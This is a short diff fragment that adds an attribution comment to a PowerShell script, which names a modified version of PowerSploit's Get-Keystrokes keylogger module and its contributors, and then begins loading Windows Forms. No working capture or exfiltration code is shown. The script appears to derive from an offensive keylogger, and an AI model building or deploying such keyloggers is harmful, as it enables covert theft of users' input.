@@ -1,3 +1,12 @@
+<#
+ Based on a modified version of the PowerSploit script:
+ 	https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1
+
+ Contributed to by:
+ 	http://www.obscuresec.com/
+    http://www.exploit-monday.com/
+    https://github.com/mattifestation
+ #>
 try {
 	Add-Type -AssemblyName System.Windows.Forms
 
